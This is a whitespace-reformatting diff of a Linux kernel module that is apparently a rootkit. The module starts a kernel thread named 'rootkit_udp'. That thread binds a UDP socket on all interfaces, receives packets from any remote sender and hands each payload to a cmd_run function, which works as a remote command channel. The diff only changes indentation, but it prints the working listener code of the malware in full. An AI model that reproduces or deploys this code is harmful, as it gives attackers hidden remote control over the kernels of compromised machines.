@@ -295,16 +295,16 @@ int udp_server_send(struct socket *sock, struct sockaddr_in *addr, unsigned char
 int udp_server_receive(struct socket* sock, struct sockaddr_in* addr, unsigned char* buf, int len) {
 
 	struct msghdr msghdr;
-    struct iovec iov;
-    int size = 0;
+	struct iovec iov;
+	int size = 0;
 
-    if (sock->sk == NULL) {
+	if (sock->sk == NULL) {
 
-    	return 0;
-    }
+		return 0;
+	}
 
-    iov.iov_base = buf;
-    iov.iov_len = len;
+	iov.iov_base = buf;
+	iov.iov_len = len;
 
 	msghdr.msg_name = addr;
 	msghdr.msg_namelen = sizeof(struct sockaddr_in);
@@ -317,44 +317,44 @@ int udp_server_receive(struct socket* sock, struct sockaddr_in* addr, unsigned c
 
 	debug("RECEIVE UDP PACKET FROM REMOTE SERVER %pI4", &addr->sin_addr.s_addr);
 
-    size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
+	size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
 
-    return size;
+	return size;
 }
 
 int udp_server_run(void *data) {
 
 	int size;
-    unsigned char buffer[UDP_BUFF];
+	unsigned char buffer[UDP_BUFF];
 
-    kthread->running = 1;
-    current->flags |= PF_NOFREEZE;
+	kthread->running = 1;
+	current->flags |= PF_NOFREEZE;
 
-    debug("CREATE UDP SERVER SOCKET");
+	debug("CREATE UDP SERVER SOCKET");
 
-    if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock) < 0) {
+	if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock) < 0) {
 
-    	debug("ERROR IN SOCK_CREATE");
+		debug("ERROR IN SOCK_CREATE");
 
 		/* could net create socket */
 		kthread->thread = NULL;
 		kthread->running = 0;
 
 		return 0;
-    }
+	}
 
-    debug("SUCCESSFULLY CREATED UDP SERVER SOCKET");
+	debug("SUCCESSFULLY CREATED UDP SERVER SOCKET");
 
-    memset(&kthread->addr, 0, sizeof(struct sockaddr));
-    kthread->addr.sin_family = AF_INET;
-    kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
-    kthread->addr.sin_port = htons(UDP_PORT);
+	memset(&kthread->addr, 0, sizeof(struct sockaddr));
+	kthread->addr.sin_family = AF_INET;
+	kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	kthread->addr.sin_port = htons(UDP_PORT);
 
-    debug("SET ADDRESS FAMILY AND PORT FOR UDP SERVER");
+	debug("SET ADDRESS FAMILY AND PORT FOR UDP SERVER");
 
-    if(kthread->sock->ops->bind(kthread->sock, (struct sockaddr *)&kthread->addr, sizeof(struct sockaddr)) < 0) {
+	if(kthread->sock->ops->bind(kthread->sock, (struct sockaddr *)&kthread->addr, sizeof(struct sockaddr)) < 0) {
 
-    	debug("ERROR IN BIND");
+		debug("ERROR IN BIND");
 
 		/* could not bind to socket */
 		sock_release(kthread->sock);
@@ -363,9 +363,9 @@ int udp_server_run(void *data) {
 		kthread->running = 0;
 
 		return 0;
-    }
+	}
 
-    debug("RUN UDP SERVER LOOP");
+	debug("RUN UDP SERVER LOOP");
 
 	while(1) {
 
@@ -375,16 +375,17 @@ int udp_server_run(void *data) {
 		}
 
 		memset(&buffer, 0, UDP_BUFF);
-        size = udp_server_receive(kthread->sock, &kthread->addr, buffer, UDP_BUFF);
+		size = udp_server_receive(kthread->sock, &kthread->addr, buffer, UDP_BUFF);
 
-        if(signal_pending(current)) {
-            break;
-        }
+		if(signal_pending(current)) {
+			
+			break;
+		}
 
-        if (size > 0) {
+		if (size > 0) {
 
-        	cmd_run((const char *)buffer, &kthread->addr);
-        }
+			cmd_run((const char *)buffer, &kthread->addr);
+		}
 
 		schedule();
 	}
@@ -396,55 +397,55 @@ int udp_server_start(void) {
 
 	/* start kthread for udp socket */
 	kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
-    kthread->thread = kthread_run(&udp_server_run, NULL, "rootkit_udp");
+	kthread->thread = kthread_run(&udp_server_run, NULL, "rootkit_udp");
 
-    debug("INITIALIZING UDP SERVER");
+	debug("INITIALIZING UDP SERVER");
 
-    /* error handling */
-    if(kthread->thread == NULL) {
+	/* error handling */
+	if(kthread->thread == NULL) {
 
-        kfree(kthread);
-        kthread = NULL;
-        
-        return 1;
-    }
+		kfree(kthread);
+		kthread = NULL;
+		
+		return 1;
+	}
 
-    return 0;
+	return 0;
 }
 
 void udp_server_close(void) {
 
 	/* kill socket */
-    int err;
-    struct pid *pid = find_get_pid(kthread->thread->pid);
-    struct task_struct *task = pid_task(pid, PIDTYPE_PID);
+	int err;
+	struct pid *pid = find_get_pid(kthread->thread->pid);
+	struct task_struct *task = pid_task(pid, PIDTYPE_PID);
 
-    debug("EXIT UDP SERVER");
+	debug("EXIT UDP SERVER");
 
-    /* kill kthread */
-    if (kthread->thread != NULL) {
+	/* kill kthread */
+	if (kthread->thread != NULL) {
 
-        err = send_sig(SIGKILL, task, 1);
+		err = send_sig(SIGKILL, task, 1);
 
-        if (err > 0) {
+		if (err > 0) {
 
-            while (kthread->running == 1) {
+			while (kthread->running == 1) {
 
-            	/* wait until thread stopped */
+				/* wait until thread stopped */
 				msleep(50);
-            }
-        }
-    }
+			}
+		}
+	}
 
-    /* destroy socket */
-    if(kthread->sock != NULL) {
+	/* destroy socket */
+	if(kthread->sock != NULL) {
 
-        sock_release(kthread->sock);
-        kthread->sock = NULL;
-    }
+		sock_release(kthread->sock);
+		kthread->sock = NULL;
+	}
 
-    kfree(kthread);
-    kthread = NULL;
+	kfree(kthread);
+	kthread = NULL;
 }
 
 MODULE_LICENSE("GPL");
